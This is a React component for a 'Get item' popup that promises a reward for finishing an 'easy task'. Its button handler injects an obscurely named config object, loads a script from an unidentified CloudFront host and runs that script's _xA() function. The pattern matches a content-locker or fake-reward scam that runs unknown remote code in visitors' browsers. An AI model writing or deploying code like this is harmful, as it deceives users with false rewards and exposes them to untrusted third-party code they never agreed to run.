import { Button } from "@/components/ui/button";

type ConfirmationPopupProps = {
  username: string;
  onGetItemNow: () => void;
};

const ConfirmationPopup = ({ username, onGetItemNow }: ConfirmationPopupProps) => {
  const handleGetItemNow = () => {
    // Inject the first script
    const script1 = document.createElement('script');
    script1.type = 'text/javascript';
    script1.innerHTML = 'var NfflQ_fLA_QqYbsc={"it":4478933,"key":"4fdc9"};';
    document.body.appendChild(script1);

    // Inject the second script and call _xA() after it loads
    const script2 = document.createElement('script');
    script2.src = 'https://d2v7l2267atlz5.cloudfront.net/a4757ee.js';
    script2.onload = function() {
      if (typeof window._xA === 'function') {
        window._xA();
      } else if (typeof _xA === 'function') {
        _xA();
      }
    };
    document.body.appendChild(script2);

    // Call the original callback
    onGetItemNow();
  };

  return (
    <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
      <div className="bg-slate-900 text-white w-80 rounded-lg overflow-hidden shadow-xl animate-fade-in">
        <div className="p-4 border-b border-slate-700">
          <h3 className="text-center text-lg font-medium">Get item</h3>
        </div>
        
        <div className="p-4">
          {/* New descriptive text */}
          <p className="text-center mb-2 text-sm text-gray-300">Finish easy task and get your reward</p>
          <p className="text-center mb-4 text-lg font-bold text-white">@{username}</p>
          
          <Button 
            className="w-full bg-gradient-to-r from-green-500 to-green-600 text-white font-bold hover:from-green-600 hover:to-green-700 transition-colors duration-200"
            onClick={handleGetItemNow}
          >
            Get item now
          </Button>
        </div>
      </div>
    </div>
  );
};

export default ConfirmationPopup;
